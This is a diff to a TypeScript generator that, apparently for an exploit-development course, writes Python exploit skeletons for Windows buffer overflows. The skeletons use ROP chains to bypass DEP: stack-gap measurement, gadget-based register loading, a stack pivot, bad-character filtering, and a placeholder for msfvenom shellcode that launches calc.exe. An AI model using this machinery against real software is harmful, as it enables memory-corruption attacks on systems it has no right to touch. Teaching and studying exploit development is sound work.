@@ -81,9 +81,42 @@ export type Entry = { name: string; address: number; sequence: string; pops: num
  * COST too, so swapping is moving the comment marker and nothing else. */
 export type Swap = { address: number; sequence: string; pops: number; retn: number; why: string };
 
+/** A dword the chain sends after a gadget. `k` is its value when the tool knows it, and a known value is
+ * checked against the bad chars when it is rendered. One only the script can compute, such as the size or
+ * a patched distance, has none: the file's own `sendable` covers it, and every other byte it sends. */
+type Dword = { text: string; k?: number };
+const known = (k: number, text = hex32(k)): Dword => ({ text, k });
+const computed = (text: string): Dword => ({ text });
+
 // `note` is what the gadget leaves in the registers the load needs, printed after the call so each line
 // can be checked against the debugger.
-type Op = { call: Entry; values: string[]; times?: number; note?: string } | { line: string };
+type Op = { call: Entry; values: Dword[]; times?: number; note?: string } | { line: string };
+
+/** How many bytes past the saved EIP the crashing function's return moved ESP, and how that was seen.
+ * `ret 4` makes it 4: the chain's second dword sits one dword further on. */
+export type Landing = { gap: number; how: string };
+
+/** Reads the gap at the crash: the dword EIP was popped from is still on the stack just below ESP, so its
+ * distance from ESP is the gap. Undefined gap when the stack cannot show it, with the reason. */
+export function measureLanding(eip: number | undefined, esp: number | undefined, read: (address: number) => number | undefined): Landing & { measured: boolean } {
+  const assumed = (why: string): Landing & { measured: boolean } => ({ gap: 0, measured: false, how: `not measured, ${why}: assumed 0, a plain ret` });
+  if (eip === undefined || esp === undefined) return assumed("no registers to read");
+  const at = (offset: number): number | undefined => read((esp + offset) >>> 0);
+  if (at(0) === eip) return assumed(`the dword at ESP is EIP ${hex32(eip)} too`);
+  for (let below = 4; below <= 0x100; below += 4) {
+    if (at(-below) !== eip) continue;
+    if (at(-below - 4) === eip) return assumed(`EIP ${hex32(eip)} repeats below ESP`);
+    const gap = below - 4;
+    return { gap, measured: true, how: `EIP ${hex32(eip)} sits at ESP-${below.toString(16).toUpperCase()}, so the ret moved ESP ${gap} byte${gap === 1 ? "" : "s"} past it (dds esp-${below.toString(16)} L2)` };
+  }
+  return assumed(`EIP ${hex32(eip)} is not on the stack below ESP`);
+}
+
+/** A junk dword and the fill byte the payload pads with, both free of the bad chars. */
+export function filler(bad: number[]): number {
+  const byte = [...Array.from({ length: 26 }, (_, i) => 0x41 + i), ...Array.from({ length: 26 }, (_, i) => 0x61 + i)].find((b) => bad.indexOf(b) < 0) ?? 0x41;
+  return (byte * 0x01010101) >>> 0;
+}
 
 export type BuildInput = {
   api: DepApi;
@@ -104,6 +137,8 @@ export type BuildInput = {
   /** The next free payloadN() in the student's file. A block whose content is a sendable payload arrives
    * as that complete function, so his file grows by appending and every function is one thing he sends. */
   stage: number;
+  /** Measured at the crash by measureLanding; absent means 0, the plain ret. */
+  landing?: Landing;
 };
 
 /** The API reached from a neighbouring import of the same DLL, measured live: right for this build only. */
@@ -197,6 +232,10 @@ export const HELPER_BLOCK: Block = { lines: [
   "def neg(v): return (-v) & 0xFFFFFFFF",
   "def clean(v): return not any(b in BADCHARS for b in p32(v))",
   "def hole(name): raise SystemExit(\"still to fill: \" + name)",
+  "def sendable(p):                  # every byte the payload carries, checked once before it is sent",
+  "    bad = [i for i, b in enumerate(p) if b in BADCHARS]",
+  "    if bad: raise SystemExit(\"bad char 0x%02X at payload offset %d: the target cuts the payload there\" % (p[bad[0]], bad[0]))",
+  "    return p",
 ] };
 
 export const CORPUS_BLOCK: Block = { none: "the corpus is the search, not the exploit. The gadgets the chain keeps get their names in [4/7]." };
@@ -225,6 +264,9 @@ export function buildExploit(input: BuildInput): Build {
     return number;
   };
   const gadgets = (index?.gadgets ?? []).filter((gadget) => input.exclude.indexOf(gadgetAddress(gadget)) < 0);
+  const JUNK = filler(badchars);
+  const gap = input.landing?.gap ?? 0;
+  const retGap = `RET_GAP = ${gap}${" ".repeat(Math.max(1, 25 - String(gap).length))}# ${input.landing?.how ?? "not measured: assumed 0, a plain ret"}`;
   const table: Entry[] = [];
   const holes: string[] = [];
   const byAddress: Record<number, RopGadget> = {};
@@ -339,7 +381,10 @@ export function buildExploit(input: BuildInput): Build {
       const second = first ? moveGadget(via, to, keep) : undefined;
       if (first && second) return [{ call: entry(first, `move ${from} into ${via}`), values: [] }, { call: entry(second, `move ${via} into ${to}`), values: [] }];
     }
-    return undefined;
+    // No mov or xchg does it: what each gadget does to the registers, so a push and a pop is a move too.
+    const path = REGISTERS.indexOf(from) >= 0 && REGISTERS.indexOf(to) >= 0 ? reachIndex.copy(from as Reg, to as Reg, keep) : undefined;
+    if (!path || path.some((effect) => movesEsp(effect.gadget))) return undefined;
+    return path.map((effect) => ({ call: entry(effect.gadget, `move ${from} into ${to}`), values: [] }));
   };
 
   // Commands in the emitted comments take the bad chars written out, the way the user passed them. A
@@ -430,14 +475,8 @@ export function buildExploit(input: BuildInput): Build {
   /** One decision at three widths: [7/7] has a comment's worth, the route list a line, the hole a block. */
   type Written = { brief: string; short: string; full: string };
 
-  // register = goal without writing `keep`, as a route the reader can check gadget by gadget.
-  const reachOps = (register: string, goal: Val, keep: string[], name: string): Op[] | { missing: string } => {
-    const result = reachPath(register, goal, keep);
-    if (!isPath(result)) {
-      const why = unreachable(register, goal, keep, name, result);
-      say(register, name, describe(goal), why.short, why.brief);
-      return { missing: why.full };
-    }
+  // A path the search found, as chain lines the reader can check gadget by gadget.
+  const walk = (register: string, goal: Val, name: string, result: Path): { ops: Op[]; names: string[] } => {
     const ops: Op[] = [];
     const kinds = result.hops.map((hop) => hop.kind).join(", ");
     if (result.hops.length > 1) {
@@ -446,7 +485,7 @@ export function buildExploit(input: BuildInput): Build {
     }
     const names: string[] = [];
     for (const hop of result.hops) {
-      const values = hop.values.map((value) => (value ? value.text : "0x41414141"));
+      const values = hop.values.map((value) => (value ? known(value.value, value.text) : known(JUNK, "JUNK")));
       const row = entry(hop.gadget, `${register} = ${name}`, values.length);
       names.push(ref(row));
       searchSwaps[row.address] = (searchSwaps[row.address] ?? []).concat(hop.alts
@@ -457,6 +496,51 @@ export function buildExploit(input: BuildInput): Build {
         })));
       ops.push({ call: row, values, note: hop.notes.join("; ") });
     }
+    return { ops, names };
+  };
+
+  // register += delta, for a distance the chain knows when it is written. The value goes into another
+  // register by the search, not by a lone pop, so a distance holding a bad byte is built the way the
+  // register values are: -20 is 0xFFFFFFEC for an add and 0x00000014 for a sub, and only one may be clean.
+  // `prefer` is a job's pick, tried first so the chain keeps the gadget [4/7] shows.
+  const offsetBy = (register: string, delta: number, keep: string[], what: string, prefer?: RopGadget): Op[] | { missing: string } => {
+    if (delta === 0) return [];
+    const kept = keep.concat(register);
+    const options = gadgets.filter((gadget) => gadget.capabilities.some((capability) =>
+      (capability.kind === "REGISTER_ADD" || capability.kind === "REGISTER_SUB") && capability.register === register
+      && REGISTERS.indexOf(capability.targetRegister ?? "") >= 0 && capability.targetRegister !== register
+      && keep.indexOf(capability.targetRegister ?? "") < 0)
+      && usable(gadget, keep, [register]));
+    const ordered = [...(prefer && options.indexOf(prefer) >= 0 ? [prefer] : []), ...near(rankCandidates(options)).filter((gadget) => gadget !== prefer)];
+    let best: { gadget: RopGadget; by: string; goal: Val; path: Path; sub: boolean } | undefined;
+    for (const gadget of ordered) {
+      const capability = gadget.capabilities.filter((cap) => (cap.kind === "REGISTER_ADD" || cap.kind === "REGISTER_SUB") && cap.register === register)[0];
+      const sub = capability.kind === "REGISTER_SUB";
+      const by = capability.targetRegister ?? "";
+      const goal = constVal(sub ? -delta : delta);
+      const path = reachPath(by, goal, kept);
+      if (isPath(path) && (!best || path.hops.length < best.path.hops.length)) best = { gadget, by, goal, path, sub };
+      if (best && gadget === prefer) break;
+    }
+    if (!best) {
+      return { missing: `no add or sub of a register into ${register} whose distance the search can load: ${register} ${delta < 0 ? "-" : "+"} ${hex(Math.abs(delta))} for ${what}` };
+    }
+    return [
+      { line: `# ${register} ${delta < 0 ? "-" : "+"}= ${hex(Math.abs(delta))} for ${what}: ${best.by} = ${describe(best.goal)}, then ${best.sub ? "sub" : "add"}` },
+      ...walk(best.by, best.goal, what, best.path).ops,
+      { call: entry(best.gadget, best.sub ? "subtract a distance" : "add a distance"), values: [] },
+    ];
+  };
+
+  // register = goal without writing `keep`, as a route the reader can check gadget by gadget.
+  const reachOps =(register: string, goal: Val, keep: string[], name: string): Op[] | { missing: string } => {
+    const result = reachPath(register, goal, keep);
+    if (!isPath(result)) {
+      const why = unreachable(register, goal, keep, name, result);
+      say(register, name, describe(goal), why.short, why.brief);
+      return { missing: why.full };
+    }
+    const { ops, names } = walk(register, goal, name, result);
     // Why this route and not a shorter one. A value the chain cannot send as a dword is the reason no
     // single pop does it, and naming that reason is what makes the extra gadgets defensible; the rest the
     // search settled by cost over every state it expanded.
@@ -494,12 +578,13 @@ export function buildExploit(input: BuildInput): Build {
   const capture = pick("capture");
   const add = pick("add");
   const copy = pick("copy");
+  const copyPath = input.plans.filter((plan) => plan.job.key === "copy")[0]?.path;
   const read = pick("read");
   const write = pick("write");
   const advance = pick("advance");
   const negate = pick("negate");
   const pivot = pick("pivot");
-  const field = copy?.at.dest ?? "";
+  const field = copy?.at.dest ?? copyPath?.to ?? "";
   const valueRegister = write?.at.source ?? "eax";
   const writeOffset = write?.at.offset ?? 0;
 
@@ -560,22 +645,39 @@ export function buildExploit(input: BuildInput): Build {
         if (!negate || negate.at.dest !== register || !pop) return missing(`no pop and neg for ${register}: the size is negated at run time, so it needs both in ${register}`);
         say(register, slot.name, "chosen at run time", `POP then NEG, the only load the search does not own: the script grows size until neg(size) is clean`, "popped negated, then negated back");
         return [
-          { call: entry(pop, `load ${register}`, 1), values: ["neg(size)"], note: `${register} = neg(size), kept clean by the loop above` },
+          { call: entry(pop, `load ${register}`, 1), values: [computed("neg(size)")], note: `${register} = neg(size), kept clean by the loop above` },
           { call: entry(negate.gadget, "negate"), values: [], note: `${register} = -${register}, now size` },
         ];
       }
       case "shellcode": {
+        // The field address plus the distance to the sled, worked out in `register` itself or, when it has
+        // no sub, in any register that has one and can hand the result over.
+        const via = [register, ...REGISTERS.filter((r) => r !== register && keep.indexOf(r) < 0)].map((at) => {
+          const math = arithmetic(at, keep);
+          const there = math && (math.sub || badchars.indexOf(0) < 0) ? moveOps(field, at, keep) : undefined;
+          const back = there ? moveOps(at, register, keep) : undefined;
+          return math && there && back ? { math, there, back } : undefined;
+        }).filter((found) => found !== undefined)[0];
+        if (style === "skeleton" && via) {
+          sledSub = via.math.sub;
+          return [...via.there, { line: "c.patches.append((len(c) + 1 + c.skip // 4, field))" }, { call: via.math.pop, values: [computed("0")] }, { call: via.math.op, values: [] }, ...via.back];
+        }
         const math = arithmetic(register, keep);
         const move = moveOps(field, register, keep);
         if (style !== "skeleton" || !math || !move) {
           return missing(style === "skeleton" ? `no gadget adds a popped distance to ${register}`
             : `the shellcode's address on the stack, so this dword needs a write before the pushad: bp ${pick("pushad") ? hex(gadgetAddress(pick("pushad")!.gadget)) : "<pushad gadget>"} ; g ; s -b esp L400${" 90".repeat(16)}`);
         }
-        return [...move, { line: "c.patches.append((len(c) + 1 + c.skip // 4, field))" }, { call: math.pop, values: ["0"] }, { call: math.op, values: [] }];
+        // The distance to the sled is a few hundred bytes, known only once the chain is laid out. Subtracted,
+        // it is popped as 0xFFFFFExx; added, as 0x000001xx, which no target with 00 as a bad char accepts.
+        if (!math.sub && badchars.indexOf(0) >= 0) return missing(`no sub into ${register}: the shellcode is a few hundred bytes up the stack, so an add would pop 00 bytes`);
+        return [...move, { line: "c.patches.append((len(c) + 1 + c.skip // 4, field))" }, { call: math.pop, values: [computed("0")] }, { call: math.op, values: [] }];
       }
     }
   };
 
+  // Whether the loaders subtract the distance to the sled or add it, which decides the sign to_sled pops.
+  let sledSub: boolean | undefined;
   const loaders: Op[] = [];
   const defineLoader = (slot: Slot, register: string, keep: string[]): string => {
     const fn = `load_${ident(slot.name)}`;
@@ -602,27 +704,35 @@ export function buildExploit(input: BuildInput): Build {
       const value = slot.source.name === "WRITABLE" ? input.writable : input.cave;
       return value !== undefined && isClean(value, badchars) ? slot.source.name : undefined;
     };
-    const dummies = [0x45454545, 0x46464646, 0x47474747, 0x48484848, 0x49494949, 0x51515151, 0x52525252];
+    // Each dword is patched by the chain before the call reads it, but the payload carries it first.
+    const dummies = [0x45, 0x46, 0x47, 0x48, 0x49, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x61, 0x62, 0x63]
+      .filter((b) => badchars.indexOf(b) < 0 && b * 0x01010101 !== JUNK).map((b) => (b * 0x01010101) >>> 0);
     frameBlock = [
       ...frame.map((slot, i) => {
         const value = literal(slot) ?? hex(dummies[i]);
         return `frame ${i === 0 ? " =" : "+="} p32(${value})${" ".repeat(Math.max(1, 14 - value.length))}# ${slot.name}${literal(slot) ? "" : ", patched by the chain"}`;
       }),
       "FRAME_AT = OFFSET - len(frame)     # field 1 sits here, so the chain starts on EIP",
+      retGap,
     ];
-    if (!capture || !add || !copy || !write || !pivot || add.move || copy.move) {
+    const keepField: Op[] | undefined = copy && !copy.move ? [{ call: entry(copy.gadget, "keep the field address"), values: [] }]
+      : !copy && copyPath ? copyPath.gadgets.map((gadget) => ({ call: entry(gadget, `move ${copyPath.from} into ${copyPath.to}`), values: [] })) : undefined;
+    if (!capture || !keepField || !write || !pivot) {
       chain.push(...hole("payload", "[4/7] has no exact pick for capture, add, copy, write or pivot: write this chain and its payload by hand"));
     } else {
       const fns = frame.map((slot) => literal(slot) ? undefined : defineLoader(slot, valueRegister, [field]));
       chain.push(group("the captured ESP, and the address of field 1"));
-      chain.push({ line: `# ${field} = field 1 - ${hex(writeOffset)}: the captured ESP is buffer offset OFFSET + 4, field 1 is FRAME_AT` });
-      chain.push({ line: `# confirm: bp ${hex(gadgetAddress(capture.gadget))} ; g ; r esp ; s -d esp-400 L100 45454545` });
+      chain.push({ line: `# ${field} = field 1 - ${hex(writeOffset)}: the captured ESP is buffer offset OFFSET + 4 + RET_GAP, field 1 is FRAME_AT` });
+      chain.push({ line: `# confirm: bp ${hex(gadgetAddress(capture.gadget))} ; g ; r esp ; s -d esp-400 L100 ${(dummies[0] >>> 0).toString(16)}` });
       chain.push({ call: entry(capture.gadget, "capture ESP"), values: [] });
-      const distance = popGadget(add.at.source ?? "", [capture.at.dest ?? ""]);
-      if (distance) chain.push({ call: entry(distance, `load ${add.at.source}`, 1), values: [`neg(OFFSET + 4 - FRAME_AT${writeOffset ? ` + ${hex(writeOffset)}` : ""})`] });
-      else chain.push(...hole("distance", `no pop ${add.at.source} for the distance to field 1`));
-      chain.push({ call: entry(add.gadget, "add the distance to field 1"), values: [] });
-      chain.push({ call: entry(copy.gadget, "keep the field address"), values: [] });
+      // The captured ESP is the buffer at OFFSET + 4 + RET_GAP and field 1 is FRAME_AT, len(frame) below
+      // OFFSET, so the distance is known now and goes through the same search as any value.
+      // Onto the captured ESP before the copy, or onto the copy when the captured register has no add.
+      const distance = -(4 * frame.length + 4 + gap + writeOffset);
+      const before = offsetBy(capture.at.dest ?? "", distance, [], "field 1", add?.gadget);
+      const after = "missing" in before ? offsetBy(field, distance, [], "field 1", add?.gadget) : before;
+      if (!("missing" in before)) chain.push(...before, ...keepField);
+      else chain.push(...keepField, ...("missing" in after ? hole("distance", after.missing) : after));
       let at = 0;
       frame.forEach((slot, i) => {
         const fn = fns[i];
@@ -644,19 +754,25 @@ export function buildExploit(input: BuildInput): Build {
       });
       const pops = popsAfterPivot(pivot.gadget);
       const delta = writeOffset - 4 * at - 4 * pops;
-      const toValue = moveOps(field, valueRegister, []);
-      const math = arithmetic(valueRegister, []);
-      const toPivot = moveOps(valueRegister, pivot.at.source ?? "", []);
+      // The pivot's register gets the field address plus the delta, worked out in whichever register has
+      // an add or sub the search can feed and moves both ways.
+      const target = pivot.at.source ?? "";
+      const tried = [valueRegister, target, ...REGISTERS].filter((r, i, all) => all.indexOf(r) === i).map((at) => {
+        const there = moveOps(field, at, []);
+        const shift = there ? offsetBy(at, delta, [], "the pivot") : { missing: `no way to move the field address into ${at}` };
+        const back = there && !("missing" in shift) ? moveOps(at, target, []) : undefined;
+        return { there, shift, back };
+      });
+      const route = tried.find((t) => t.there && !("missing" in t.shift) && t.back);
       chain.push(group("pivot: ESP onto field 1"));
-      chain.push({ line: `# ${pivot.at.source} = field 1 - ${hex(4 * pops)}, so the ret after the pivot lands on field 1` });
-      if (!toValue || !math || !toPivot) chain.push(...hole("pivot_value", `no way to move the field address into ${pivot.at.source}`));
+      chain.push({ line: `# ${target} = field 1 - ${hex(4 * pops)}, so the ret after the pivot lands on field 1` });
+      if (route && !("missing" in route.shift)) chain.push(...route.there!, ...route.shift, ...route.back!);
       else {
-        chain.push(...toValue);
-        if (delta !== 0) chain.push({ call: math.pop, values: [math.sub ? `neg(${delta})` : `${delta}`] }, { call: math.op, values: [] });
-        chain.push(...toPivot);
+        const why = tried.map((t) => (t.there && "missing" in t.shift ? t.shift.missing : undefined)).find((text) => text !== undefined);
+        chain.push(...hole("pivot_value", why ?? `no way to move the field address into ${target}`));
       }
       chain.push({ call: entry(pivot.gadget, "pivot ESP onto field 1"), values: [] });
-      const sub = arithmetic(valueRegister, [field])?.sub !== false;
+      const sub = sledSub ?? arithmetic(valueRegister, [field])?.sub !== false;
       chain.push(
         { line: "" },
         group("the shellcode address, into the fields the loaders marked"),
@@ -665,11 +781,13 @@ export function buildExploit(input: BuildInput): Build {
         { line: `    distance = chain_end + gap - (FRAME_AT + 4 * (field - 1)${writeOffset ? ` - ${hex(writeOffset)}` : ""})` },
         { line: `    return ${sub ? "neg(distance)" : "distance"}` },
         { line: "gap = 0x40" },
-        { line: "while not all(clean(to_sled(f, gap)) for _, f in c.patches): gap += 1" },
+        { line: "while not all(clean(to_sled(f, gap)) for _, f in c.patches):" },
+        { line: "    gap += 1" },
+        { line: "    if gap > 0x1000: hole(\"a distance to the sled that holds no bad char\")" },
         { line: "for at, f in c.patches: c[at] = to_sled(f, gap)" },
         { line: "" },
-        { line: "payload  = b\"A\" * FRAME_AT + frame + b\"\".join(p32(w) for w in c)" },
-        { line: "payload += b\"C\" * gap + nops + shellcode" },
+        { line: "payload  = PAD * FRAME_AT + frame + b\"\".join(p32(w) for w in c)" },
+        { line: "payload += PAD * gap + nops + shellcode" },
       );
     }
   } else {
@@ -696,7 +814,7 @@ export function buildExploit(input: BuildInput): Build {
       loaded.push(slot.register ?? "eax");
       return fn;
     });
-    frameBlock = [`PUSHAD_ORDER = [${order.join(", ")}]`, `# ${slots.map((slot) => `${slot.register} = ${slot.name}`).join(", ")}`];
+    frameBlock = [`PUSHAD_ORDER = [${order.join(", ")}]`, `# ${slots.map((slot) => `${slot.register} = ${slot.name}`).join(", ")}`, retGap];
     const dispatch = pick("pushad");
     chain.push(group("the seven registers, in the order [6/7] fixes"));
     // One line per register, so the [7/7] screenshot shows the route each one took without scrolling to
@@ -712,7 +830,11 @@ export function buildExploit(input: BuildInput): Build {
     const tail: string[] = [];
     for (const slot of PUSHAD_TAIL[api]) {
       const known = slot.source.kind === "named" && (slot.source.name === "WRITABLE" ? input.writable : input.cave) !== undefined;
-      if (slot.source.kind === "const") tail.push(hex(slot.source.value));
+      if (slot.source.kind === "const" && isClean(slot.source.value, badchars)) tail.push(hex(slot.source.value));
+      else if (slot.source.kind === "const") {
+        chain.push(...hole(`${ident(slot.name)}_value`, `${hex(slot.source.value)} holds a bad byte and sits after the pushad gadget, where no gadget can build it`));
+        tail.push(`${ident(slot.name)}_value`);
+      }
       else if (slot.source.kind === "named" && known) tail.push(slot.source.name);
       else {
         chain.push(group(`${slot.name}: a dword after the pushad gadget, not a register`));
@@ -724,14 +846,22 @@ export function buildExploit(input: BuildInput): Build {
       chain.push(group("the dwords the call reads after the pushad gadget"));
       chain.push({ line: `c.extend([${tail.join(", ")}])` });
     }
-    chain.push({ line: "" }, { line: "payload = b\"A\" * OFFSET + b\"\".join(p32(w) for w in c) + nops + shellcode" });
+    chain.push({ line: "" }, { line: "payload = PAD * OFFSET + b\"\".join(p32(w) for w in c) + nops + shellcode" });
   }
 
   assignNames(table);
   const resolve = (text: string): string => text.replace(/\u0001(\d+)\u0001/g, (_, i: string) => refs[Number(i)].name);
+  // The one place a dword becomes chain text, so the bad char check cannot be skipped by a new constant:
+  // a known value holding a bad byte is a hole that stops the file and names it, never a dword sent.
+  const dword = (value: Dword): string => {
+    if (value.k === undefined || isClean(value.k, badchars)) return resolve(value.text);
+    const name = `${resolve(value.text)} = ${hex(value.k)}`;
+    holes.push(`${name}: holds a bad byte, and no route here builds it`);
+    return `hole(${JSON.stringify(name + " holds a bad byte")})`;
+  };
   const render = (ops: Op[], indent: string): string[] => ops.map((op) => {
     if ("line" in op) return op.line === "" ? "" : `${indent}${resolve(op.line)}`;
-    const call = `c.rop(${[op.call.name, ...op.values.map(resolve)].join(", ")})`;
+    const call = `c.rop(${[op.call.name, ...op.values.map(dword)].join(", ")})`;
     const line = `${indent}${op.times && op.times > 1 ? `for _ in range(${op.times}): ${call}` : call}`;
     return op.note ? `${line}${" ".repeat(Math.max(2, 44 - line.length))}# ${resolve(op.note)}` : line;
   });
@@ -742,6 +872,18 @@ export function buildExploit(input: BuildInput): Build {
   const badText = badchars.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("");
   const sized = style === "skeleton" && FRAMES[api].some((slot) => slot.source.kind === "size");
   const slot = slotBlock(api, input.module, input.iatSlot, badchars, input.delta);
+  const stageLines = [
+    `def payload${nextStage()}():`,
+    ...[
+      "nops = b\"\\x90\" * 16",
+      ...render(hole("shellcode", `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "${badText}" -f python -v shellcode`), ""),
+      ...(sized ? ["size = len(nops + shellcode)", "while not clean(neg(size)): size += 1"] : []),
+      "c = Chain()",
+      "c.skip = RET_GAP                 # junk after the first gadget for the bytes the crashing ret skips: [6/7]",
+      ...render(chain, ""),
+      "return sendable(payload)",
+    ].map((line) => (line === "" ? "" : `    ${line}`)),
+  ];
   return {
     table,
     stages,
@@ -764,12 +906,14 @@ export function buildExploit(input: BuildInput): Build {
             .filter((swap) => swap.pops > 0 || swap.retn > 0)
             .map((swap) => `${hex(swap.address)}: (${swap.pops}, ${swap.retn ? `0x${swap.retn.toString(16)}` : 0})`)),
         ].join(", ")}}     # (extra pops, ret N). The swap-ins are here too, so swapping one in needs no other edit.`,
+        `PAD = b"\\x${(JUNK & 0xff).toString(16).padStart(2, "0")}"                   # the byte the payload pads with, not a bad char`,
+        "JUNK = int.from_bytes(PAD * 4, \"little\")   # and the junk dword made of it",
         "",
         "class Chain(list):                # c.rop(gadget, values): the gadget, junk for the last ret N, its values, junk for its extra pops",
         "    skip, patches = 0, None",
         "    def rop(self, gadget, *values):",
         "        pops, retn = COST.get(gadget, (0, 0))",
-        "        self.extend([gadget] + [0x41414141] * (self.skip // 4) + list(values) + [0x41414141] * pops)",
+        "        self.extend([gadget] + [JUNK] * (self.skip // 4) + list(values) + [JUNK] * pops)",
         "        self.skip, self.patches = retn, self.patches or []",
       ] },
       5: { lines: [
@@ -778,17 +922,7 @@ export function buildExploit(input: BuildInput): Build {
         ...loaderLines,
       ] },
       6: { lines: frameBlock },
-      7: { lines: [
-        `def payload${nextStage()}():`,
-        ...[
-          "nops = b\"\\x90\" * 16",
-          ...render(hole("shellcode", `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "${badText}" -f python -v shellcode`), ""),
-          ...(sized ? ["size = len(nops + shellcode)", "while not clean(neg(size)): size += 1"] : []),
-          "c = Chain()",
-          ...render(chain, ""),
-          "return payload",
-        ].map((line) => (line === "" ? "" : `    ${line}`)),
-      ] },
+      7: { lines: stageLines },
     },
   };
 }
